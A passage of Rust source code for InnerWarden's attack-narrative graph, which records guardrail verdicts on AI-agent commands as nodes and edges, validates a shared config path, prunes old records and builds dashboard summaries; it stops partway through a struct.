//! Shared attack-narrative graph for InnerWarden.
//!
//! This crate is PURE, it is the graph MODEL plus the logic to turn guardrail
//! verdicts into nodes/edges, generate a human narrative, and merge graphs. It
//! does NOT persist anything: InnerWarden Community's CLI owns the small local
//! JSON file. The model deliberately leaves room for host-level node kinds, but
//! no Active Defence ingestion path is implied by this crate today.
//!
//! It also owns the RULE for where that file lives ([`graph_path`]), which is
//! shared logic rather than persistence: the caller supplies the environment and
//! the bytes it read, this crate decides. That split is what keeps the rule
//! testable without a machine that has the paid product installed.
//!
//! Node/edge `kind` are strings on purpose so Active Defence can add node kinds
//! (`process`, `file`, `connection`) without this crate changing.

use serde::{Deserialize, Serialize};
use serde_json::Value;
use std::collections::{BTreeMap, HashMap};

/// A graph node, keyed by a stable `id` so ingesting the same thing twice merges
/// rather than duplicates.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Node {
    pub id: String,
    /// "session" | "command" | "category" | "asi", the Community kinds;
    /// Future producers may add "process" | "file" | "connection" without a schema break.
    pub kind: String,
    pub label: String,
    #[serde(default, skip_serializing_if = "BTreeMap::is_empty")]
    pub attrs: BTreeMap<String, String>,
}

/// A directed, typed edge. Deduped by `(from, to, kind)`.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct Edge {
    pub from: String,
    pub to: String,
    /// "ran" (session→command) | "triggered" (command→category) | "flags"
    /// (command→asi) | "next" (command→command) | ... (Active Defence may add
    /// "spawned", ...).
    pub kind: String,
}

/// The narrative graph. Nodes are unique by id; edges unique by (from,to,kind).
#[derive(Debug, Clone, Default, PartialEq, Eq, Serialize, Deserialize)]
pub struct Graph {
    #[serde(default)]
    pub nodes: Vec<Node>,
    #[serde(default)]
    pub edges: Vec<Edge>,
}

/// Where the paid product declares the record location that BOTH halves use.
///
/// A FILE and not an environment variable, and this is the whole point of it.
/// The free CLI is started by three different parents: the operator in a shell,
/// a hook inside an AI agent (which inherits the agent's environment), and the
/// MCP proxy (which inherits the MCP client's). A variable exported from
/// `/etc/profile.d` reaches only the first, and the other two are precisely the
/// ones that produce the decisions the paid dashboard exists to show. A file
/// every process can open needs nobody to have sourced anything.
///
/// World-readable and root-written, under `/etc` because that is where a
/// system-wide product configuration belongs and because the paid agent runs
/// with `ProtectHome=yes`, which empties `/home` inside its mount namespace
/// (measured on test001 on 2026-08-28 and written up in spec-052). Anything the
/// two halves have to agree on therefore cannot live in the operator home.
///
/// # What the paid installer has to create alongside it
///
/// ```text
/// /var/lib/innerwarden/guard/   2770  innerwarden:innerwarden   (setgid)
///   graph.json                  0660  <operator>:innerwarden
///   guard-events.jsonl          0660  <operator>:innerwarden
/// ```
///
/// The setgid bit is not decoration. Measured on test001 (Ubuntu 24.04) on
/// 2026-08-28: a new file in a `0770 <user>:adm` directory lands `<user>:<user>`
/// and only `2770` gives it `adm`, because Linux hands a new file the CREATOR's
/// primary group unless the directory says otherwise. A plain `0770` shared
/// directory therefore produces `<operator>:<operator>` records that the
/// `innerwarden` user matches only as OTHER, with no bits, which is the same
/// empty dashboard this whole change exists to end.
///
/// The operator must also be a member of the `innerwarden` group (it already
/// exists, `gid 989`, and is empty today). The free CLI does not rely on the
/// installer having got either part right: it sets the group of the files it
/// creates to the shared directory's group, which POSIX permits for a member of
/// that group. Both halves being correct is belt and braces on purpose, because
/// one half being correct is exactly what shipped last time.
pub const GUARD_CONFIG_PATH: &str = "/etc/innerwarden/guard.toml";

/// Upper bound on the product config. It is a handful of lines by design, so a
/// large one is either corruption or somebody else's file, and an unbounded read
/// of a path this code does not own is how a reader becomes a denial of service.
pub const MAX_PRODUCT_CONFIG_BYTES: u64 = 64 * 1024;

/// Longest record path accepted from the product config.
const MAX_GRAPH_FILE_CHARS: usize = 4096;

/// What the caller found at [`GUARD_CONFIG_PATH`].
///
/// This crate performs no I/O, so the read belongs to the caller; this is the
/// shape it hands back. `Refused` carries the caller's stable reason code for a
/// file that exists but could not be trusted or read, which is deliberately NOT
/// the same as `Absent`: absent means the free product is installed on its own
/// and the home is the right answer, while refused means the two halves are
/// about to disagree about where the record lives.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum ProductConfig {
    /// No such file. Nothing to reconcile.
    Absent,
    /// The file's contents, already bounded and vetted by the caller.
    Present(String),
    /// The file exists and was not usable, with a stable reason code.
    Refused(&'static str),
}

/// Which rule produced the resolved record path.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum GraphPathSource {
    /// `IW_GRAPH_FILE`.
    EnvironmentOverride,
    /// [`GUARD_CONFIG_PATH`].
    ProductConfigFile,
    /// `$HOME/.config/innerwarden/graph.json`.
    OperatorHome,
    /// Nothing named a record file.
    Unresolved,
}

/// A product config that exists and cannot be honoured.
///
/// It carries a `message` and not just a code because the failure mode this
/// whole change exists to end is a SILENT divergence: the paid agent reading one
/// path while the free CLI writes another, with the only symptom being an empty
/// dashboard. Falling back without saying so would rebuild that exact defect one
/// layer up.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct ConfigProblem {
    /// Stable machine code. Fixed strings only: a code is quoted into an
    /// operator-visible message, so it must never carry file contents.
    pub code: &'static str,
    /// One English line naming the file, the code and the consequence. It
    /// deliberately does not echo the configured value, because the value is the
    /// hostile part of a file this process does not own.
    pub message: String,
}

/// The resolved record path plus how it was reached.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct GraphPathResolution {
    /// The record file, or `None` when nothing named one.
    pub path: Option<std::path::PathBuf>,
    pub source: GraphPathSource,
    /// Set only when a product config EXISTS and could not be honoured.
    pub config_problem: Option<ConfigProblem>,
}

/// The single `graph_file` key the product config carries. Unknown keys are
/// accepted and ignored on purpose: a newer installer must be able to add a key
/// without an older CLI refusing the whole file and silently returning to the
/// home.
#[derive(Debug, Deserialize)]
struct ProductConfigFile {
    #[serde(default)]
    graph_file: Option<String>,
}

/// Read the record path out of the product config text. Pure: the caller does
/// the I/O. `Err` is a stable reason code.
///
/// Hostile input is the premise, not an edge case. Any local user can read this
/// file, root writes it, and this code cannot verify that the root who wrote it
/// meant what it says. So the value is validated rather than trusted, and every
/// rejection is a documented outcome instead of a surprise later in the writer.
pub fn parse_product_config(text: &str) -> Result<std::path::PathBuf, &'static str> {
    if text.len() as u64 > MAX_PRODUCT_CONFIG_BYTES {
        return Err("config_too_large");
    }
    let parsed: ProductConfigFile = toml::from_str(text).map_err(|_| "config_malformed")?;
    let Some(raw) = parsed.graph_file else {
        return Err("config_missing_graph_file");
    };
    validate_graph_file(&raw)
}

/// The rules a configured record path has to satisfy, and why each one exists.
fn validate_graph_file(raw: &str) -> Result<std::path::PathBuf, &'static str> {
    if raw.trim().is_empty() {
        return Err("config_graph_file_empty");
    }
    // Surrounding whitespace is silently accepted by most path APIs and is
    // almost always a typo in a hand-edited file. Refusing beats writing the
    // record to a neighbouring path nobody expects.
    if raw != raw.trim() {
        return Err("config_graph_file_padded");
    }
    if raw.chars().count() > MAX_GRAPH_FILE_CHARS {
        return Err("config_graph_file_too_long");
    }
    // Covers NUL, newline and every other control character. A newline here
    // would be carried into operator-visible output and log lines; a NUL is
    // where a path stops being the path the check inspected.
    if raw.chars().any(char::is_control) {
        return Err("config_graph_file_control_character");
    }
    // Compared against a leading slash rather than `Path::is_absolute`, which is
    // platform dependent: `/var/lib/...` is NOT absolute on Windows, and the
    // rule this file encodes must mean the same thing everywhere it is read.
    if !raw.starts_with('/') {
        return Err("config_graph_file_not_absolute");
    }
    if raw.ends_with('/') {
        return Err("config_graph_file_not_a_file");
    }
    let mut segments = raw.split('/').filter(|segment| !segment.is_empty());
    if segments.clone().any(|segment| segment == "..") {
        return Err("config_graph_file_parent_traversal");
    }
    if segments.next().is_none() {
        return Err("config_graph_file_not_a_file");
    }
    Ok(std::path::PathBuf::from(raw))
}

/// One English line saying what went wrong and, more importantly, what it costs.
fn fallback_message(code: &str, recorded_in_home: bool) -> String {
    if recorded_in_home {
        format!(
            "{GUARD_CONFIG_PATH} exists but does not name a usable record file ({code}), \
             so decisions are being recorded under the operator home instead, where an \
             InnerWarden agent running as its own user cannot read them. \
             Fix that file or remove it."
        )
    } else {
        format!(
            "{GUARD_CONFIG_PATH} exists but does not name a usable record file ({code}), \
             and no other record location is set, so decisions are not being recorded. \
             Fix that file or remove it."
        )
    }
}

/// The shared graph-file path: the override `IW_GRAPH_FILE`, else the record
/// location declared by [`GUARD_CONFIG_PATH`], else
/// `$HOME/.config/innerwarden/graph.json`. Defined once here so every Community
/// command uses the same local record.
///
/// The middle step is the fix for spec-052. The paid agent runs as its own user
/// with `ProtectHome=yes`, so it cannot see the operator home at all, let alone
/// read a `0750` one; the shared record therefore moves to
/// `/var/lib/innerwarden/guard/` and the paid installer writes that location
/// here. The free product on its own finds no config file and keeps writing to
/// the home, which is where a standalone product's record belongs.
///
/// A config file that exists and cannot be honoured falls back to the home AND
/// reports a [`ConfigProblem`], because a silent fallback would put the free
/// CLI's writes and the paid agent's reads on two different files, which is the
/// defect being fixed rather than a safe degradation. The caller is responsible
/// for surfacing it.
///
/// A configured path that does not exist yet, or cannot be created, is NOT a
/// fallback case: it resolves and the writer fails loudly through the existing
/// recording-health path. Quietly writing somewhere else would split the two
/// products again, which is the one outcome this function must never produce.
///
/// # Every outcome, with its reason code
///
/// | state of `/etc/innerwarden/guard.toml` | record path | reported |
/// |---|---|---|
/// | absent | `$HOME` | no, this is the free product alone |
/// | valid | as declared | no |
/// | symlink (`config_is_a_symlink`) | `$HOME` | yes |
/// | FIFO, directory, device (`config_not_a_regular_file`) | `$HOME` | yes |
/// | group or world writable (`config_is_writable_by_others`) | `$HOME` | yes |
/// | unreadable, any other I/O error (`config_unreadable`) | `$HOME` | yes |
/// | over 64 KiB (`config_too_large`) | `$HOME` | yes |
/// | not UTF-8 (`config_not_utf8`) | `$HOME` | yes |
/// | not TOML, or `graph_file` is not a string (`config_malformed`) | `$HOME` | yes |
/// | empty, or no `graph_file` key (`config_missing_graph_file`) | `$HOME` | yes |
/// | `graph_file = ""` (`config_graph_file_empty`) | `$HOME` | yes |
/// | padded with whitespace (`config_graph_file_padded`) | `$HOME` | yes |
/// | over 4096 chars (`config_graph_file_too_long`) | `$HOME` | yes |
/// | control character in it (`config_graph_file_control_character`) | `$HOME` | yes |
/// | relative (`config_graph_file_not_absolute`) | `$HOME` | yes |
/// | a directory or `/` (`config_graph_file_not_a_file`) | `$HOME` | yes |
/// | contains `..` (`config_graph_file_parent_traversal`) | `$HOME` | yes |
/// | valid, path missing or uncreatable | as declared | by the WRITER, not here |
///
/// "Reported" means a [`ConfigProblem`] the caller surfaces. The last row is the
/// deliberate exception: an unwritable configured path is a writer failure the
/// recording-health path already reports, and answering it with a quiet home
/// fallback would recreate the split.
/// `read_config` is a closure and not a value so the override short-circuits
/// before any filesystem access. This runs once per screened action on the hook
/// hot path, and an override means the answer is already known.
pub fn graph_path(
    get: impl Fn(&str) -> Option<String>,
    read_config: impl FnOnce() -> ProductConfig,
) -> GraphPathResolution {
    if let Some(p) = get("IW_GRAPH_FILE").filter(|s| !s.trim().is_empty()) {
        return GraphPathResolution {
            path: Some(std::path::PathBuf::from(p)),
            source: GraphPathSource::EnvironmentOverride,
            config_problem: None,
        };
    }

    let code = match read_config() {
        ProductConfig::Absent => None,
        ProductConfig::Refused(code) => Some(code),
        ProductConfig::Present(text) => match parse_product_config(&text) {
            Ok(path) => {
                return GraphPathResolution {
                    path: Some(path),
                    source: GraphPathSource::ProductConfigFile,
                    config_problem: None,
                }
            }
            Err(code) => Some(code),
        },
    };

    let path = get("HOME")
        .filter(|h| !h.trim().is_empty())
        .map(|h| std::path::PathBuf::from(h).join(".config/innerwarden/graph.json"));
    GraphPathResolution {
        source: if path.is_some() {
            GraphPathSource::OperatorHome
        } else {
            GraphPathSource::Unresolved
        },
        config_problem: code.map(|code| ConfigProblem {
            code,
            message: fallback_message(code, path.is_some()),
        }),
        path,
    }
}

/// Escape/trim a command so a single node label cannot carry a runaway payload.
fn short(s: &str, max: usize) -> String {
    let t = s.trim();
    if t.chars().count() <= max {
        t.to_string()
    } else {
        let head: String = t.chars().take(max.saturating_sub(1)).collect();
        format!("{head}…")
    }
}

/// The `recommendation` of a verdict. Missing/invalid evidence is `unknown`;
/// absence must never be presented as an allow decision.
fn recommendation_of(verdict: &Value) -> &str {
    verdict
        .get("recommendation")
        .and_then(|r| r.as_str())
        .unwrap_or("unknown")
}

/// How the guardrail was being used when a command was screened. This is kept
/// separate from the verdict: a `deny` in monitor mode is evidence that the
/// command *would* be blocked, not that a block actually happened.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum DecisionMode {
    Monitor,
    Enforce,
    Check,
    #[default]
    Unknown,
}

impl DecisionMode {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Monitor => "monitor",
            Self::Enforce => "enforce",
            Self::Check => "check",
            Self::Unknown => "unknown",
        }
    }
}

/// What the guardrail itself actually did with a screened command.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub enum DecisionOutcome {
    Allowed,
    Blocked,
    WouldBlock,
    Screened,
    #[default]
    Unknown,
}

impl DecisionOutcome {
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Allowed => "allowed",
            Self::Blocked => "blocked",
            Self::WouldBlock => "would_block",
            Self::Screened => "screened",
            Self::Unknown => "unknown",
        }
    }
}

/// Runtime context attached to a newly recorded decision. Older callers and old
/// graph files remain valid: missing context is deliberately `unknown`, because
/// a historic deny verdict cannot honestly be reconstructed as an actual block.
#[derive(Debug, Clone, Copy, Default, PartialEq, Eq)]
pub struct DecisionContext {
    pub mode: DecisionMode,
    pub outcome: DecisionOutcome,
    /// Milliseconds since Unix epoch. Optional so a clock failure never changes a
    /// security verdict or prevents the graph from recording it.
    pub recorded_at_ms: Option<u64>,
}

/// A read index built ONCE per query: id→node, plus out-edges (from→edges) and
/// in-edges (to→edges) adjacency. Turns the polled read paths from O(edges × nodes)
/// into O(edges + nodes + result).
struct Index<'a> {
    by_id: std::collections::HashMap<&'a str, &'a Node>,
    out: std::collections::HashMap<&'a str, Vec<&'a Edge>>,
    inn: std::collections::HashMap<&'a str, Vec<&'a Edge>>,
}

impl Graph {
    pub fn new() -> Self {
        Graph::default()
    }

    /// Parse a persisted graph (empty string = empty graph).
    pub fn from_json(s: &str) -> Result<Self, serde_json::Error> {
        if s.trim().is_empty() {
            return Ok(Graph::default());
        }
        serde_json::from_str(s)
    }

    /// Serialize for persistence.
    pub fn to_json(&self) -> String {
        serde_json::to_string(self).unwrap_or_else(|_| "{}".into())
    }

    pub fn is_empty(&self) -> bool {
        self.nodes.is_empty() && self.edges.is_empty()
    }

    /// Insert a node, or merge its attrs/label into the existing one with the same
    /// id (later non-empty label wins; attrs union, new values win). Returns a
    /// mutable index-free handle by id.
    pub fn upsert_node(&mut self, node: Node) {
        if let Some(existing) = self.nodes.iter_mut().find(|n| n.id == node.id) {
            if !node.label.is_empty() {
                existing.label = node.label;
            }
            if existing.kind.is_empty() {
                existing.kind = node.kind;
            }
            for (k, v) in node.attrs {
                existing.attrs.insert(k, v);
            }
        } else {
            self.nodes.push(node);
        }
    }

    /// Cap on retained nodes. Readers already bound what they SHOW (500 items,
    /// `take(limit)`), but the store itself had no cap, so the file grew for the
    /// life of the install (audit UNSF-05).
    ///
    /// Chosen well above what any reader surfaces, so pruning can never remove
    /// something a view would have displayed.
    pub const MAX_NODES: usize = 20_000;

    /// Serialised size the store is kept under, independent of the node count.
    ///
    /// Set below every reader limit in the product so a graph that is at its
    /// node cap still loads with room to spare. Without it the store grew to
    /// 16,777,528 bytes on a real install, 312 bytes past the 16 MiB reader
    /// limit, and recording stopped dead for six hours with no visible signal.
    pub const MAX_BYTES: usize = 12 * 1024 * 1024;

    /// Drop the oldest nodes past [`Self::MAX_NODES`], and every edge that then
    /// dangles.
    ///
    /// Insertion order is the age order here: `upsert_node` appends new ids and
    /// mutates existing ones in place, so the front of the vector is the oldest
    /// material. An edge whose endpoint was pruned is removed too, because a
    /// dangling edge would make a reader render a relationship to a node it
    /// cannot resolve.
    pub fn prune(&mut self) -> usize {
        let mut dropped = self.drop_oldest(self.nodes.len().saturating_sub(Self::MAX_NODES));
        // A node cap alone does not bound the file. Nodes carry commands, and at
        // 20k nodes a real graph measured 15.6 MB, close enough to any reader's
        // limit that one long command could put it over and wedge every later
        // write. The byte budget is what actually keeps the store loadable.
        while self.nodes.len() > 1 && self.to_json().len() > Self::MAX_BYTES {
            dropped += self.drop_oldest((self.nodes.len() / 10).max(1));
        }
        dropped
    }

    /// Drop the `count` oldest nodes and every edge that then dangles.
    /// Drop the oldest nodes, EXCEPT session anchors.
    ///
    /// # The bug this exists to prevent, measured on a real install
    ///
    /// A session node is created before the first command of that session, so
    /// it is always among the oldest material in the store, and age is exactly
    /// what this function selects on. Dropping it took every `ran` edge with it
    /// (`retain` removes an edge whose `from` was dropped), leaving the command
    /// nodes behind with nothing pointing at them. The next command recreated
    /// the session node at the END of the vector and started a fresh, tiny set
    /// of edges.
    ///
    /// Measured on the operator's own machine before this fix: 15,632 command
    /// nodes in the file and 1,889 `ran` edges. The dashboard counts commands
    /// one way for the Overview and walks `ran` edges for the Activity list, so
    /// it reported 15,623 decisions recorded and could only ever show 1,876 of
    /// them. Filtering by "needs review" showed 6 items under a headline that
    /// said 136. The linked ratio by sequence made the cause unmistakable:
    /// 87.8% at the start, 0.0% across the whole middle, 66.8% at the end, one
    /// gap per prune.
    ///
    /// The old doc claimed the cap was "chosen well above what any reader
    /// surfaces, so pruning can never remove something a view would have
    /// displayed". That was true of the command nodes and false of the one node
    /// every view depends on to find them.
    ///
    /// Session nodes are a handful (4 on that install, against 15k commands),
    /// so keeping them all costs nothing and preserves the only path a reader
    /// has into the history.
    fn drop_oldest(&mut self, count: usize) -> usize {
        if count == 0 {
            return 0;
        }
        let count = count.min(self.nodes.len());
        let mut dropped: std::collections::HashSet<String> = std::collections::HashSet::new();
        let mut kept_anchors: Vec<Node> = Vec::new();
        for node in self.nodes.drain(..count) {
            if node.kind == "session" {
                kept_anchors.push(node);
            } else {
                dropped.insert(node.id);
            }
        }
        // Anchors go back at the FRONT, so they stay the oldest material and are
        // offered to the next prune again. Putting them at the back would make
        // them look newest and quietly reorder the age ordering this function
        // relies on.
        for node in kept_anchors.into_iter().rev() {
            self.nodes.insert(0, node);
        }
        self.edges
            .retain(|e| !dropped.contains(&e.from) && !dropped.contains(&e.to));
        dropped.len()
    }

    /// Add an edge unless the exact (from,to,kind) already exists.
    pub fn add_edge(&mut self, from: &str, to: &str, kind: &str) {
        let exists = self
            .edges
            .iter()
            .any(|e| e.from == from && e.to == to && e.kind == kind);
        if !exists {
            self.edges.push(Edge {
                from: from.to_string(),
                to: to.to_string(),
                kind: kind.to_string(),
            });
        }
    }

    /// Fold `other` into `self`: every node is upserted and every edge deduped.
    /// Producers can use shared ids to attach richer evidence without changing
    /// the merge algorithm.
    pub fn merge(&mut self, other: &Graph) {
        for n in &other.nodes {
            self.upsert_node(n.clone());
        }
        for e in &other.edges {
            self.add_edge(&e.from, &e.to, &e.kind);
        }
    }

    /// Ingest one guardrail verdict for `command` as the `seq`-th command of
    /// `session`. Adds the session node, a command node (with recommendation +
    /// risk), the ATR category + OWASP-Agentic (ASI) nodes it triggered, and the
    /// sequence edge from the previous command. This is what makes the narrative
    /// start in InnerWarden Community.
    pub fn ingest_verdict(&mut self, session: &str, seq: usize, command: &str, verdict: &Value) {
        self.ingest_verdict_with_context(
            session,
            seq,
            command,
            verdict,
            DecisionContext::default(),
        );
    }

    /// Ingest a verdict with the runtime context needed to distinguish a policy
    /// recommendation from its real-world outcome. The command node id remains
    /// `cmd:<session>:<seq>`, which is stable across serialization and reloads.
    pub fn ingest_verdict_with_context(
        &mut self,
        session: &str,
        seq: usize,
        command: &str,
        verdict: &Value,
        context: DecisionContext,
    ) {
        let session_id = format!("session:{session}");
        self.upsert_node(Node {
            id: session_id.clone(),
            kind: "session".into(),
            label: session.to_string(),
            attrs: BTreeMap::new(),
        });

        let cmd_id = format!("cmd:{session}:{seq}");
        let rec = recommendation_of(verdict).to_string();
        let mut attrs = BTreeMap::new();
        attrs.insert("recommendation".into(), rec.clone());
        attrs.insert("seq".into(), seq.to_string());
        attrs.insert("source".into(), "guardrail".into());
        // The legacy ingestion API leaves these absent rather than writing an
        // explicit unknown. This keeps merges safe: an old producer cannot
        // overwrite a known outcome previously attached by a context-aware one.
        if context.mode != DecisionMode::Unknown {
            attrs.insert("mode_at_decision".into(), context.mode.as_str().to_string());
        }
        if context.outcome != DecisionOutcome::Unknown {
            attrs.insert("outcome".into(), context.outcome.as_str().to_string());
        }
        if let Some(recorded_at_ms) = context.recorded_at_ms {
            attrs.insert("recorded_at_ms".into(), recorded_at_ms.to_string());
        }
        // Which layer of the pipeline produced this verdict: the deterministic
        // rules (default), the session graph (chain escalation), the on-device
        // Warden model (ambiguous cases), an LLM, or a human. Community is
        // rules-only today; a verdict can carry `decided_by` to override once
        // Warden/LLM land.
        let decided_by = verdict
            .get("decided_by")
            .and_then(|d| d.as_str())
            .filter(|s| !s.is_empty())
            .unwrap_or("rules");
        attrs.insert("decided_by".into(), decided_by.to_string());
        if let Some(r) = verdict.get("risk_score").and_then(|r| r.as_i64()) {
            attrs.insert("risk".into(), r.to_string());
        }
        // The human reason, kept (trimmed) so the dashboard can show WHY a command
        // was flagged in its drill-down without re-running the engine.
        if let Some(why) = verdict.get("explanation").and_then(|e| e.as_str()) {
            let why = why.trim();
            if !why.is_empty() {
                attrs.insert("explanation".into(), short(why, 300));
            }
        }
        self.upsert_node(Node {
            id: cmd_id.clone(),
            kind: "command".into(),
            label: short(command, 120),
            attrs,
        });
        self.add_edge(&session_id, &cmd_id, "ran");

        // ATR categories the command matched.
        if let Some(matches) = verdict.get("atr_matches").and_then(|m| m.as_array()) {
            for m in matches {
                if let Some(cat) = m.get("category").and_then(|c| c.as_str()) {
                    let cat_id = format!("cat:{cat}");
                    self.upsert_node(Node {
                        id: cat_id.clone(),
                        kind: "category".into(),
                        label: cat.to_string(),
                        attrs: BTreeMap::new(),
                    });
                    self.add_edge(&cmd_id, &cat_id, "triggered");
                }
            }
        }

        // OWASP Agentic (ASI) ids the verdict flagged.
        if let Some(ids) = verdict.get("asi_ids").and_then(|a| a.as_array()) {
            for id in ids {
                if let Some(asi) = id.as_str() {
                    let asi_id = format!("asi:{asi}");
                    self.upsert_node(Node {
                        id: asi_id.clone(),
                        kind: "asi".into(),
                        label: asi.to_string(),
                        attrs: BTreeMap::new(),
                    });
                    self.add_edge(&cmd_id, &asi_id, "flags");
                }
            }
        }

        // Sequence edge from the previous command in this session.
        if seq > 0 {
            let prev = format!("cmd:{session}:{}", seq - 1);
            if self.nodes.iter().any(|n| n.id == prev) {
                self.add_edge(&prev, &cmd_id, "next");
            }
        }
    }

    /// The next command index for `session`: one past the HIGHEST index it has.
    ///
    /// Deliberately not a count. Ids are `cmd:<session>:<seq>` and `upsert_node`
    /// mutates a node with an existing id in place, so the moment anything
    /// removes an old command, a count-derived index points back at an id that
    /// is still in use and the next command OVERWRITES a surviving one instead
    /// of appending. Pruning does exactly that, so counting was a data-loss bug
    /// waiting on a large enough graph.
    pub fn next_seq(&self, session: &str) -> usize {
        let prefix = format!("cmd:{session}:");
        self.nodes
            .iter()
            .filter(|n| n.kind == "command")
            .filter_map(|n| n.id.strip_prefix(&prefix))
            .filter_map(|seq| seq.parse::<usize>().ok())
            .max()
            .map_or(0, |highest| highest + 1)
    }

    /// Counts for a quick summary / dashboard.
    pub fn stats(&self) -> GraphStats {
        let mut s = GraphStats::default();
        for n in &self.nodes {
            match n.kind.as_str() {
                "session" => s.sessions += 1,
                "command" => {
                    s.commands += 1;
                    match n.attrs.get("recommendation").map(String::as_str) {
                        Some("deny") => {
                            s.blocked += 1; // backwards-compatible alias
                            s.deny_verdicts += 1;
                        }
                        Some("review") => {
                            s.review += 1; // backwards-compatible alias
                            s.review_verdicts += 1;
                        }
                        Some("allow") => s.allow_verdicts += 1,
                        _ => s.unknown_verdicts += 1,
                    }
                    match n.attrs.get("outcome").map(String::as_str) {
                        Some("blocked") => s.actual_blocks += 1,
                        Some("would_block") => s.would_block += 1,
                        Some("screened") => s.screened += 1,
                        Some("allowed") => {}
                        _ => s.outcomes_unknown += 1,
                    }
                }
                _ => {}
            }
        }
        s
    }

    /// A human narrative of the graph, grouped by session, in ingest order. This
    /// is Community's headline output: what the AI agent did and what the
    /// guardrail made of it.
    pub fn narrate(&self) -> String {
        let sessions: Vec<&Node> = self.nodes.iter().filter(|n| n.kind == "session").collect();
        if sessions.is_empty() {
            return "No agent activity recorded yet.".into();
        }
        let mut out = String::new();
        for sess in sessions {
            let sid = &sess.id;
            // command nodes reachable from this session by a "ran" edge, in seq order.
            let mut cmds: Vec<&Node> = self
                .edges
                .iter()
                .filter(|e| &e.from == sid && e.kind == "ran")
                .filter_map(|e| self.nodes.iter().find(|n| n.id == e.to))
                .collect();
            cmds.sort_by_key(|n| {
                n.attrs
                    .get("seq")
                    .and_then(|s| s.parse::<usize>().ok())
                    .unwrap_or(0)
            });
            let deny_verdicts = cmds
                .iter()
                .filter(|c| c.attrs.get("recommendation").map(String::as_str) == Some("deny"))
                .count();
            out.push_str(&format!(
                "Session {}, {} command(s), {} deny verdict(s):\n",
                sess.label,
                cmds.len(),
                deny_verdicts
            ));
            for c in &cmds {
                let rec = c
                    .attrs
                    .get("recommendation")
                    .map(String::as_str)
                    .unwrap_or("unknown");
                let outcome = c
                    .attrs
                    .get("outcome")
                    .map(String::as_str)
                    .unwrap_or("unknown");
                let icon = match outcome {
                    "blocked" => "🚫",
                    "would_block" => "◇",
                    "screened" => "•",
                    "allowed" => "✓",
                    _ if rec == "deny" => "!",
                    _ if rec == "review" => "⚠️",
                    _ if rec == "allow" => "✓",
                    _ => "?",
                };
                let cats: Vec<&str> = self
                    .edges
                    .iter()
                    .filter(|e| e.from == c.id && e.kind == "triggered")
                    .filter_map(|e| self.nodes.iter().find(|n| n.id == e.to))
                    .map(|n| n.label.as_str())
                    .collect();
                let tail = if cats.is_empty() {
                    String::new()
                } else {
                    format!("  [{}]", cats.join(", "))
                };
                out.push_str(&format!(
                    "  {icon} {}, {rec} (outcome: {outcome}){tail}\n",
                    c.label
                ));
            }
        }
        out.trim_end().to_string()
    }

    /// The Home-screen summary: verdict counts, actual outcomes, the top ATR
    /// categories seen, and recent decisions. The legacy `blocked` /
    /// `recent_blocks` fields remain as deny-verdict aliases for old clients.
    /// A read index built ONCE over the graph so per-command / per-session lookups
    /// are O(degree) instead of scanning every node/edge. Without it the polled
    /// `overview` / `cases_page` are O(edges × nodes) and degrade as the graph grows.
    fn index(&self) -> Index<'_> {
        let mut by_id = std::collections::HashMap::with_capacity(self.nodes.len());
        for n in &self.nodes {
            by_id.insert(n.id.as_str(), n);
        }
        let mut out: std::collections::HashMap<&str, Vec<&Edge>> = std::collections::HashMap::new();
        let mut inn: std::collections::HashMap<&str, Vec<&Edge>> = std::collections::HashMap::new();
        for e in &self.edges {
            out.entry(e.from.as_str()).or_default().push(e);
            inn.entry(e.to.as_str()).or_default().push(e);
        }
        Index { by_id, out, inn }
    }

    fn decision_summary(&self, n: &Node, ix: &Index<'_>) -> DecisionSummary {
        let session = ix
            .inn
            .get(n.id.as_str())
            .into_iter()
            .flatten()
            .find(|e| e.kind == "ran")
            .map(|e| {
                e.from
                    .strip_prefix("session:")
                    .unwrap_or(&e.from)
                    .to_string()
            })
            .unwrap_or_default();
        let categories = ix
            .out
            .get(n.id.as_str())
            .into_iter()
            .flatten()
            .filter(|e| e.kind == "triggered")
            .filter_map(|e| ix.by_id.get(e.to.as_str()))
            .map(|nn| nn.label.clone())
            .collect();
        DecisionSummary {
            id: n.id.clone(),
            session,
            command: n.label.clone(),
            recommendation: n
                .attrs
                .get("recommendation")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            outcome: n
                .attrs
                .get("outcome")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            mode_at_decision: n
                .attrs
                .get("mode_at_decision")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
            recorded_at_ms: n
                .attrs
                .get("recorded_at_ms")
                .and_then(|s| s.parse::<u64>().ok()),
            categories,
            decided_by: n
                .attrs
                .get("decided_by")
                .cloned()
                .unwrap_or_else(|| "unknown".into()),
        }
    }

    pub fn overview(&self, recent_limit: usize) -> Overview {
        let stats = self.stats();
        let ix = self.index();

        // Count how often each ATR category was triggered, across all commands.
        let mut cat_counts: BTreeMap<String, usize> = BTreeMap::new();
        for e in &self.edges {
            if e.kind == "triggered" {
                if let Some(cat) = ix.by_id.get(e.to.as_str()).filter(|n| n.kind == "category") {
                    *cat_counts.entry(cat.label.clone()).or_insert(0) += 1;
                }
            }
        }
        let mut top: Vec<(String, usize)> = cat_counts.into_iter().collect();
        top.sort_by(|a, b| b.1.cmp(&a.1).then_with(|| a.0.cmp(&b.0)));
        let top_categories = top
            .into_iter()
            .take(8)
            .map(|(name, count)| CategoryCount { name, count })
            .collect();

        // Compatibility list: these are deny recommendations, not necessarily
        // commands that were blocked. New clients use `recent_decisions`.
        let blocks: Vec<BlockSummary> = self
            .nodes
            .iter()
            .rev()
            .filter(|n| {
                n.kind == "command"
                    && n.attrs.get("recommendation").map(String::as_str) == Some("deny")
            })
            .take(recent_limit)
            .map(|n| self.decision_summary(n, &ix))
            .collect();

        let recent_decisions: Vec<DecisionSummary> = self
            .nodes
            .iter()
            .rev()
            .filter(|n| n.kind == "command")
            .take(recent_limit)
            .map(|n| self.decision_summary(n, &ix))
            .collect();

        Overview {
            sessions: stats.sessions,
            commands: stats.commands,
